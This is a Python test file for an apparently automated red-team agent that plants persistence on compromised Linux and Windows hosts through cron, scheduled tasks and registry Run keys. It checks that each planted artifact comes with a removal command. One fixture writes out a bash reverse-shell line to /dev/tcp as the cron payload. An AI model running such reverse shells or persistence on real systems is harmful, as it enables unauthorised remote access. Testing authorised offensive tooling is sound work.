"""Tests for the PersistenceAgent sub-agent (Phase 4, Task 9).

Verifies that ``persistenceagent_subagent`` dispatches the appropriate
persistence tool(s) based on the foothold's OS type and collects the
resulting ``PersistenceArtifact`` records. Each artifact carries a
non-empty ``removal_command`` (Review Focus #3) — the Phase 5 Cleanup
Agent walks the resulting ``PersistenceAgentOutput.artifacts`` list and
runs each ``removal_command`` verbatim to tear the foothold down.

Linux: one artifact (cron @reboot).
Windows: two artifacts (schtasks ONLOGON + registry Run key — defence
in depth, covering both logon-time and reboot-time triggers).
Unknown OS: zero artifacts (graceful degradation).
"""
from unittest.mock import AsyncMock, patch

import pytest

from autored.models.postex import PersistenceArtifact
from autored.subagents.persistenceagent import (
    PersistenceAgentOutput,
    persistenceagent_subagent,
)
from autored.tools.persistence import PersistenceResult


def _make_cron_result(host_ip: str, foothold_id: str) -> PersistenceResult:
    """Build a fake ``cron_modify`` return value with a real
    ``PersistenceArtifact`` carrying a non-empty ``removal_command``."""
    artifact = PersistenceArtifact(
        host_ip=host_ip,
        method="cron",
        details={
            "schedule": "@reboot",
            "command": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
            "command_built": "sh -c (crontab -l; echo '...') | crontab -",
        },
        removal_command="crontab -l | grep -v 'bash -i' | crontab -",
        foothold_id=foothold_id,
    )
    return PersistenceResult(
        method="cron",
        host_ip=host_ip,
        success=True,
        artifact=artifact,
    )


def _make_schtasks_result(host_ip: str, foothold_id: str) -> PersistenceResult:
    artifact = PersistenceArtifact(
        host_ip=host_ip,
        method="scheduled_task",
        details={"task_name": "AutoRedUpdate", "command": "powershell -enc abc123",
                 "trigger": "ONLOGON"},
        removal_command="schtasks /delete /tn AutoRedUpdate /f",
        foothold_id=foothold_id,
    )
    return PersistenceResult(
        method="scheduled_task",
        host_ip=host_ip,
        success=True,
        artifact=artifact,
    )


def _make_reg_result(host_ip: str, foothold_id: str) -> PersistenceResult:
    artifact = PersistenceArtifact(
        host_ip=host_ip,
        method="registry_run",
        details={"key_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 "value_name": "AutoRed", "value_data": "powershell -enc abc123"},
        removal_command="reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AutoRed /f",
        foothold_id=foothold_id,
    )
    return PersistenceResult(
        method="registry_run",
        host_ip=host_ip,
        success=True,
        artifact=artifact,
    )


@pytest.mark.asyncio
async def test_persistenceagent_linux_produces_artifact_with_removal_command():
    """Linux foothold → cron persistence → one PersistenceArtifact with
    a non-empty ``removal_command`` (Review Focus #3)."""
    fake_result = _make_cron_result("10.10.10.5", "f1")
    with patch("autored.subagents.persistenceagent.cron_modify") as mock_cron:
        mock_cron.ainvoke = AsyncMock(return_value=fake_result)
        result = await persistenceagent_subagent.ainvoke({
            "foothold": {"host_ip": "10.10.10.5", "id": "f1", "access_type": "shell"},
            "os_type": "linux",
            "engagement_id": "test",
        })
    assert isinstance(result, PersistenceAgentOutput)
    assert result.host_ip == "10.10.10.5"
    assert len(result.artifacts) == 1
    # Review Focus #3: artifact must have non-empty removal_command.
    assert result.artifacts[0].removal_command
    assert "crontab" in result.artifacts[0].removal_command
    assert result.artifacts[0].method == "cron"
    assert result.artifacts[0].foothold_id == "f1"
    mock_cron.ainvoke.assert_awaited_once()


@pytest.mark.asyncio
async def test_persistenceagent_windows_produces_two_artifacts_with_removal_commands():
    """Windows foothold → schtasks + registry Run → two artifacts, each
    with a non-empty ``removal_command`` (defence in depth — either
    alone can be cleared by an alert defender, but together they cover
    both logon-time and reboot-time triggers)."""
    fake_schtasks = _make_schtasks_result("10.10.10.5", "f1")
    fake_reg = _make_reg_result("10.10.10.5", "f1")
    with patch("autored.subagents.persistenceagent.schtasks_create") as mock_schtasks, \
         patch("autored.subagents.persistenceagent.reg_modify") as mock_reg:
        mock_schtasks.ainvoke = AsyncMock(return_value=fake_schtasks)
        mock_reg.ainvoke = AsyncMock(return_value=fake_reg)
        result = await persistenceagent_subagent.ainvoke({
            "foothold": {"host_ip": "10.10.10.5", "id": "f1", "access_type": "shell"},
            "os_type": "windows",
            "engagement_id": "test",
        })
    assert isinstance(result, PersistenceAgentOutput)
    assert result.host_ip == "10.10.10.5"
    assert len(result.artifacts) == 2
    # Each artifact has a non-empty removal_command (Review Focus #3).
    assert result.artifacts[0].removal_command
    assert result.artifacts[1].removal_command
    # Schtasks removal uses ``/delete`` flag; reg removal uses ``delete`` subcommand.
    # Both forms contain the literal "delete" token — that's the Cleanup Agent's
    # contract: each artifact's removal_command must mention deletion.
    assert "delete" in result.artifacts[0].removal_command.lower()
    assert "delete" in result.artifacts[1].removal_command.lower()
    # Methods are tracked so the Cleanup Agent can branch on type.
    assert {a.method for a in result.artifacts} == {"scheduled_task", "registry_run"}
    mock_schtasks.ainvoke.assert_awaited_once()
    mock_reg.ainvoke.assert_awaited_once()


@pytest.mark.asyncio
async def test_persistenceagent_unknown_os_returns_empty_artifacts():
    """Unknown os_type → graceful degradation: no tool calls, empty
    artifacts list. Phase 5 Cleanup Agent walks an empty list safely."""
    with patch("autored.subagents.persistenceagent.cron_modify") as mock_cron, \
         patch("autored.subagents.persistenceagent.schtasks_create") as mock_schtasks, \
         patch("autored.subagents.persistenceagent.reg_modify") as mock_reg:
        mock_cron.ainvoke = AsyncMock()
        mock_schtasks.ainvoke = AsyncMock()
        mock_reg.ainvoke = AsyncMock()
        result = await persistenceagent_subagent.ainvoke({
            "foothold": {"host_ip": "10.10.10.5", "id": "f1", "access_type": "shell"},
            "os_type": "solaris",
            "engagement_id": "test",
        })
    assert isinstance(result, PersistenceAgentOutput)
    assert result.host_ip == "10.10.10.5"
    assert result.artifacts == []
    mock_cron.ainvoke.assert_not_awaited()
    mock_schtasks.ainvoke.assert_not_awaited()
    mock_reg.ainvoke.assert_not_awaited()
